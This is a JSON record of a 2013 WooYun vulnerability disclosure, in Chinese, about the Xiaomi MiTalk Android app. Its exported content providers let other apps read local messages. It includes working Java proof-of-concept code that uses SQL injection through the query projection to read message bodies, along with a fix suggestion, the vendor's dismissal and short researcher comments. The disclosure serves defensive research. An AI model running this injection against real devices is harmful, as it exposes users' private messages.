{"id": 6433, "wybug_id": "wooyun-2013-041521", "wybug_title": "米聊Android版敏感信息泄露(可读用户本地消息)", "wybug_corp": "小米科技", "wybug_author": "一灯大师", "wybug_date": "2013-10-31 09:36", "wybug_open_date": "2014-01-26 09:37", "wybug_type": "用户敏感数据泄漏", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-05：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-12-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-26：\t细节向公众公开  简要描述： 米聊Android版敏感信息泄露 详细说明：  米聊多处content provider暴露<provider android:name=\".providers.BuddyProvider\" android:readPermission=\"com.xiaomi.channel.READ_BUDDY\" android:writePermission=\"com.xiaomi.channel.WRITE_BUDDY\" android:exported=\"true\" android:authorities=\"com.xiaomi.channel.providers.BuddyProvider\" />再利用SQL注入的方式能够访问到数据库中其他的表代码如下:我们以.providers.BuddyProvider为例说明下。首先权限声明如下: <permission android:name=\"com.xiaomi.channel.READ_BUDDY\" /> <permission android:name=\"com.xiaomi.channel.WRITE_BUDDY\" /> <uses-permission android:name=\"com.xiaomi.channel.READ_BUDDY\" /> <uses-permission android:name=\"com.xiaomi.channel.WRITE_BUDDY\" />private void getmiliao(){\tint i = 0;        ContentResolver contentresolver = getContentResolver();        String[] projection = {\"* from sms--\"};        Uri uri = Uri.parse(\"content://com.xiaomi.channel.providers.BuddyProvider/buddy\");        Cursor cursor = contentresolver.query(uri, projection, null, null, null);        String text = \"\";\t\twhile (cursor.moveToNext()) {\t        text += cursor.getString(cursor.getColumnIndex(\"body\")) + '\\n';\t    }\tLog.i(\"TEST\",text);\t}另外其他两个暴露的也要主意下<provider android:name=\".providers.BuddyStatusForPhoneProvider\" android:exported=\"true\" android:authorities=\"com.xiaomi.channel.providers.BuddyStatusForPhoneProvider\" /><provider android:name=\".providers.MessageStatusProvider\" android:exported=\"true\" android:authorities=\"com.xiaomi.channel.providers.MessageStatusProvider\" />   漏洞证明：  上面的代码能够读取到sms的信息，包含各种消息\n\n米聊的安全做不得不啥样啊，还有很多问题   修复方案：  content provider做下限制，以及防止恶意注入sql   版权声明：转载请注明来源 一灯大师@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-01-26 09:37 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-31 09:49 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  大师 可以加入众测啊    \n     2013-10-31 09:57 |    \t\t一灯大师 \t\t\t( 普通白帽子  |\t\t\t        Rank:140 漏洞数:28        | 一盏灯，也能让世界安全)\t\t \n  @xsser 时间太不够了，只能小打小闹    \n     2013-10-31 15:07 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  一直觉得是不是有远程进行app的SQL注射读取数据的例子    \n     2013-10-31 15:08 |    \t\t一灯大师 \t\t\t( 普通白帽子  |\t\t\t        Rank:140 漏洞数:28        | 一盏灯，也能让世界安全)\t\t \n  @xsser 期待，哈哈    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}